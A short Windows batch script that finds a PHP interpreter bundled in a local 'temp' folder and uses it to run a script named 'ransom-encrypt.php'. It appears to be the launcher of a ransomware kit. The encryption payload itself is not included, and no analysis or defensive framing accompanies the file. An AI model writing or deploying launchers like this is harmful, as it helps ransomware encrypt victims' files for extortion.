@echo off
setlocal

REM Get the current directory
set "current_dir=%cd%"

REM Find the path to the PHP executable
set "php_dir=%current_dir%\temp"
if not exist "%php_dir%\php.exe" (
    echo PHP executable not found in %php_dir%
    exit /b 1
)

REM Execute a PHP script in the current directory
set "php_script=%current_dir%\ransom-encrypt.php"
if not exist "%php_script%" (
    echo PHP script not found in %php_script%
    exit /b 1
)

"%php_dir%\php.exe" "%php_script%"

endlocal
